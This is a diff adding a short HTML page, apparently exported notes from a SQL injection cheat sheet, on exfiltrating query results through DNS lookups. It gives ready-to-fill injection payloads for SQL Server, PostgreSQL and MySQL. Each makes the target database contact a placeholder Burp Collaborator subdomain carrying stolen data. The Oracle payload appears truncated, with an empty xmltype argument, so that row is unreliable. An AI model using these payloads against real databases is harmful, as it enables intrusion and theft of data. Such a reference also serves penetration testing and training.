@@ -1,0 +1,18 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>DNS lookup with data exfiltration</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles2.css" type="text/css" />
+</head>
+<body><h1><b><u>DNS lookup with data exfiltration</u></b></h1>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. <br />To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.<br /><table class="table"><col/><col/><tr><th>Database</th><th>Syntax</th></tr><tr><td>Oracle</td><td>SELECT extractvalue(xmltype(''),'/l') FROM dual</td></tr><tr><td>Microsoft</td><td>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')</td></tr><tr><td>PostgreSQL</td><td>create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();</td></tr><tr><td>MySQL</td><td>The following technique works on Windows only:
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</td></tr></table><br /></body></html>
